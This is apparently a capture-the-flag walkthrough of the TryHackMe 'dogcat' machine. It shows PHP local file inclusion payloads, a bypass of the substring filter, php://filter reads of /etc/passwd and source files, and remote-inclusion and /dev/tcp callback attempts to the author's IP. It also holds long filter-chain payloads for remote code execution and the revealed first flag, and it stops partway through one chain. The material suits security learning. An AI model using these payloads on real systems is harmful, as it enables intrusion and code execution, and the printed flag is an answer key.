![[Pasted image 20241219140111.png]]
Let's go!
### Connection to VPN
```bash
sudo -b openvpn Downloads/ofekerez.ovpn
ip a 
```
### DogCat Flag 1
I see when I surf to the website http://10.10.249.237 a website with two options:
1. I would like to see a cat button
2. I would like to see a dog button
First thing I do is CTRL + U to see the source code of the HTML page:
```html
<!DOCTYPE HTML>
<html>
<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="[/style.css](view-source:http://10.10.249.237/style.css)">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="[/?view=dog](view-source:http://10.10.249.237/?view=dog)"><button id="dog">A dog</button></a> <a href="[/?view=cat](view-source:http://10.10.249.237/?view=cat)"><button id="cat">A cat</button></a><br>
            </div>
</body>

</html>
```
I see that pressing the buttons leads to the same URL but with a GET parameter called view which its content is determined by the button I pressed:
Dog -> dog
Cat -> cat
First thing that comes to mind is LFI which will allow me to read files from the server.
I changed the value of the parameter to the all time classic:
```
http://10.10.249.237/?view=../../../../../../../etc/passwd
```
I get the response only dogs or cats are allowed,
I try to give it some gibberish:
```
http://10.10.249.237/?view=../../../../../../../etc/passwdog
```
and get the following error response:
**Warning**: include(../../../../../../../etc/passwdog.php): failed to open stream: No such file or directory in **/var/www/html/index.php** on line **24**

What strengthens the idea that there may be a LFI vulnerability here.
I see that it adds .php in the end of the file so I'll try to add a null byte to make the PHP interpreter to stop reading the string there and bypass the suffix it appends afterwards.
```
http://10.10.249.237/?view=../../../../../../../etc/passwd%00
```
Didnt get the file but it prevented the .php suffix, as well as with \0 
OK now what?
I see that in the error it discloses the full path of the index page.
So Ill try to include it:)
```
http://10.10.249.237/?view=../../../../../../../var/www/index
```
didnt work as well with including the php like this:
```
http://10.10.249.237/?view=../../../../../../../var/www/index.php
```
gives me the same error of "Sorry, only dogs or cats are allowed."
Let's try some wrappers:)
```
view=file:///../../../../../../../var/www/index.php
view=file:///../../../../../../../var/www/index
view=convert.base64-encode/resource=/var/www/index.php
view=data:///../../../../../../../var/www/index
view=convert.quoted-printable-encode/resource=/var/www/index
view=convert.iconv.utf-16le.utf-8/resource=\0/\0v\0a\0r\0/\0w\0w\0w\0/\0i\0n\0d\0e\0x
```
I see that all of these don't work, so lets think more deeply about why, 
it seems that the backend receives in the view GET parameter a name of an image to show and shows it.
So maybe I need to match my wrapper to a image file type?
If I open the dog resource I can see that is exists on:
```
dogs/6.jpg
which means: 
/var/www/dogs/6.jpg
I see that there are other dogs images: 1.jpg,2.jpg etc..
Same thing for the cats
cats/1..9 + .jpg
```
From looking again at the things I tried, I see that I missed the html subdirectory in my payloads.
Let's try again:
```
view=file:///../../../../../../../var/www/html/index.php
view=../../../../../../../var/www/html/index.php
view=php://../../../../../../../var/www/html/index.php
view=phar://../../../../../../../var/www/html/index.php
view=glob://../../../../../../../var/www/html/index.php
```
Ok lets think again, lets focus again on the error, it came up only when I gave the payload:
passwdog, maybe it checks if the string dog exists:
```
view=file:///../../../../../../../var/www/html/indexdog
```
Yes it triggers it again!
![[Pasted image 20241219144243.png]]
Let's try to push in another null byte to strip the .php
```
view=file:///../../../../../../../var/www/html/indexdog%00
```
![[Pasted image 20241219144305.png]]
OK now I just need to give it a file?
```
view=file:///../../../../../../../etc/passwd%00dog%00
```
Didnt work:(
Lets try again but a source file, maybe index.php:
```
view=file:///../../../../../../../var/www/html/index.php%00dog%00

```
didnt work, maybe with base64 encoding?
```
view=convert.base64-encode/resource=../../../../../../../flag.txt%00dog
```
From looking in the PHP manual I see that everything between opening tag of php and ending tag will be executed, given the example of:
```php
<?php echo shell_exec($_GET['command']);?>
```
Let's try it:
```
view=<?php echo shell_exec($_GET['command']);?>%00dog&command=id
```
didnt work
lets try something simpler:
```
view=<?php echo getcwd();?>%00dog
```
didnt work as well.
```
view=<?php file_get_contents(./../../../../../../../../../../../../../etc/passwd)?>%00dog
view=php://file_get_contents(../../../../../../../../../../../../../etc/passwd)?>%00dog
view=php://file_get_contents(/etc/passwd)?>%00dog
view=file:///etc/passwd%00dog
view=iconv.mime-decode/resource=/etc/passwd%00dog
view=php://filter/resource=/etc/passwd%00dog
view=./*.php%00dog
view=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Findex.php%00dog
view=flag.txt%00dog
view=data://text/plain;base64/resource=/etc/passwd%00dog
view=readfile("php://filter/read=string.toupper/resource=/etc/passwd")%00dog
view=index.php,include_path=/etc/passwd%00dog
```
OK I see that it doesnt work and nothing came up from looking at the PHP documentation, so lets try to debug it using php insterpreter...
```bash
cd /var/www/html && php -S 0.0.0.0:8000
php -a
```
![[Pasted image 20241219162956.png]]
I see that file:///etc/passwd should work so lets stick to it!
```
view=file:///etc/passwd%00dog
```
Again it doesn't work, maybe it is because it tries to parse an image?
Let's try to use some other wrappers on top of it.
```
view=convert.iconv.utf-16le.utf-8/resource=\0f\0i\0l\0e\0:\0/\0/\0e\0t\0c\0p\0a\0s\0s\0w\0d
view=convert.iconv.utf-16le.utf-8/resource=\0f\0i\0l\0e\0:\0/\0/\0e\0t\0c\0p\0a\0s\0s\0w\0d%00dog
view=convert.base64-encode/resource=../../../../../../../flag.txt%00dog
view=file://index.php%00dog
view=http://10.8.3.163:8000%00dog
```
Thought that maybe I could make the server approach me with an http request and include my php code, but it did not work.
Lets look at the Manual:
![[Pasted image 20241220022235.png]]
seems interesting...
lets test it!
```
view=php://filter/resource=/etc/passwd%00dog
view=php://filter/read=string.toupper/resource=/etc/passwd%00dog
view=php://filter/read=string.tolower/resource=/etc/passwd%00dog
view=php://filter/read=convert.base64-encode/resource=/root/flag.txt%00dog
view=php://filter/read=convert.base64-encode/resource=/flag.txt%00dog
view=php://filter/read=convert.base64-encode/resource=/etc/hosts%00dog
view=php://filter/read=convert.base64-encode/resource=../../../../../../../etc/passwd%00dog
view=php://filter/read=convert.quoted-printable-encode/resource=/var/www/html/index.php%00dog
view=php://filter/read=convert.quoted-printable-encode/resource=/etc/passwd%00dog
view=php://filter/read=convert.quoted-printable-encode/resource=/etc/hostname%00dog
```

Lets go back to the website functionality:
I pressed F12 in my firefox and opened the network tab, to see exactly what happens in a normal flow of the website.
When I press the button cat I send a GET request to the / route with a GET parameter of view which equals cat.
Then, the browser sends another GET request for an image of a cat, I repeated the process a couple times and it seems that the image is shuffled.
maybe I can enter the cats directory?
No I get 403.
Lets try to dirbust a little just to make sure we don't miss an easier attack surface.
```python
gobuster dir -u "http://10.10.67.141" -w /usr/share/seclists/Discovery/Web-Content/big.txt -x .php
```
## Dirbust result
```
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/cat.php              (Status: 200) [Size: 26]
/cats                 (Status: 301) [Size: 311] [--> http://10.10.67.141/cats/]
/dog.php              (Status: 200) [Size: 26]
/dogs                 (Status: 301) [Size: 311] [--> http://10.10.67.141/dogs/]
/flag.php             (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 418]
/server-status        (Status: 403) [Size: 277]
```
As I thought, there are two files dog.php and cat.php which are included by the index page when given the view parameter with dog/cat accordingly.
It makes sense because we saw that the index page logic adds .php suffix to the view parameter value.
So lets try to include one of those files and see their content:
```
view=php://filter/read=convert.quoted-printable-encode/resource=dog
```
Seems like it worked!
I got ![](http://10.10.67.141/3D"dogs/2.jpg")=0D=0A as a result.
Lets do something easier and convert it to base64:
```
view=php://filter/read=convert.base64-encode/resource=cat
PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K
```

```bash
echo -n "PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
```
Got the content of cat.php!
```php
<img src="cats/<?php echo rand(1, 10); ?>.jpg" />
```
So how do I leverage it to an actual LFI?
```
view=php://filter/read=convert.base64-encode/resource=flag.php%00dog
```
Still doesnt work
lets try something else:
```
view=php://filter/read=convert.base64-encode/resource=dog.php%00dog
```
Still doesnt work, maybe there is a problem with the php suffix or the null byte?
```
view=php://filter/read=convert.base64-encode/resource=./dog # Worked
view=php://filter/read=convert.base64-encode/resource=./dog/../../../../../../etc/passwd
view=php://filter/read=convert.base64-encode/resource=./dog/../flag.php%00
```
Actually, I dont need the .php suffix and the null byte in the end in this case because I already have the dog string in my URL.
So lets try it:
```
view=php://filter/read=convert.base64-encode/resource=./dog/../flag
```
and get:
```
PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=
```

```bash 
echo -n "PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=" | base64 -d
```

# ==First flag==
```bash
THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
```


# Second flag
Ok now that I can read any php file on the server what can I do with it?
maybe read index.php?
```
view=php://filter/read=convert.base64-encode/resource=./dog/../index
```

Reult:
```
PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
```


```bash
echo -n "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" | base64 -d
```


```php
<!DOCTYPE HTML>
<html>
<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>
<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>
    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>
</html>
```

I see that I can control the ext, allowing me to include any page on the server, not just php
so lets do it:
```
view=php://filter/read=convert.base64-encode/resource=./dog/../../../../../../etc/passwd&ext=
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

```
view=php://filter/read=convert.base64-encode/resource=./dog/../../../../../../proc/$$/cmdline&ext=
```
Didnt work for some reason,
lets try environ
```
view=php://filter/read=convert.base64-encode/resource=./dog/../../../../../../proc/$$/environ&ext=
view=php://filter/read=convert.base64-encode/resource=./dog/../../../../proc/net/environment&ext=
```
didnt work as well
```
view=php://filter/read=convert.base64-encode/resource=./dog/../../../../dev/tcp/10.8.3.163/4444&ext=
```
tried to make the server connect to me but didnt work as well.
```
view=php://filter/read=convert.base64-encode/resource=./dog/../../../../proc/self/cmdline&ext=

```
returned:
```
apache2-DFOREGROUND
```
Maybe I can get the php.ini?
```
view=php://filter/read=convert.base64-encode/resource=./dog/../../../../var/www/html/php&ext=.ini
view=php://filter/read=convert.base64-encode/resource=./dog/../../../../var/www/php&ext=.ini

```

I can't think of another files I may want, so lets try now to write a php webshell on the server?
lets try maybe to exploit an RFI?
```
view=php://filter/read/resource=http://10.8.3.163:8000/dog.php&ext=
```
didnt work, maybe its disabled by the server configuration.

There is no exact documentation on how to write a file using php wrappers,
but this snippet of code:
```
`/* This will filter the string "Hello World"   through the rot13 filter, then write to   example.txt in the current directory */   file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello World");`
```
So let's try with interactive php to find the way to do so.
```
php://filter/write=string.rot13/resource=example.txt/content="Hello World"
php://filter/write/resource=php://temp/resource=abcd
```
I know that there is a script that puts a webshell using the temp:// wrapper but until Daniel will answer my message, lets try another methods:
ftp:// and ssh://
```
view=ftp://10.8.3.163/dog.php
```
I get the following error:
```
include(): ftp:// wrapper is disabled in the server configuration by allow_url_include=0 in <b>/var/www/html/index.php
```
and this for the ssh2 wrapper
```
include(): Unable to find the wrapper &quot;ssh2&quot; - did you forget to enable it when you configured PHP? in <b>/var/www/html/index.php
```
So it seems that there is no other way to execute code on the machine:(
Daniel approved using the filter chain script :)
https://github.com/synacktiv/php_filter_chain_generator
![[Pasted image 20241220062441.png]]
Lets generate it in base64 and give the script the base64 flag:
```bash
echo "<?php echo system($_REQUEST["cmd"]); ?>" | base64                         
PD9waHAgZWNobyBzeXN0ZW0oKTsgPz4K
```
didnt work because of the superglobal,
lets do it this way:
```
echo "<?php  echo system(\"id\"); ?>" | base64                           
PD9waHAgIGVjaG8gc3lzdGVtKCJpZCIpOyA/Pgo=
echo -n "PD9waHAgIGVjaG8gc3lzdGVtKCJpZCIpOyA/Pgo=" | base64 -d # to ensure it is the right content
python php_filter_chain_generator.py --rawbase64 "PD9waHAgIGVjaG8gc3lzdGVtKCJpZCIpOyA/Pgo="
```
didnt work as well the functionality of rawbase64 is different, its just for testing.
I need to switch the outer double quotes to single quotes then I will be able to not use escaping
```bash
echo '<?php  echo system("id"); ?>' | base64                           
python php_filter_chain_generator.py --chain '<?php  echo system("id"); ?>'
```
Then, I need to format the chain into the LFI I found:
## Payload 1:
```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|/resource=php://temp
```
Ok it doesnt work this way, what can mess it up:
1. encoding
2. doesn't trigger the LFI right
3. too long input
lets check it on our local server,
it works right away, meaning that the problem is with the payload I send to the server specifically.
lets try the repo example for simplicity, which runs phpinfo:
```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF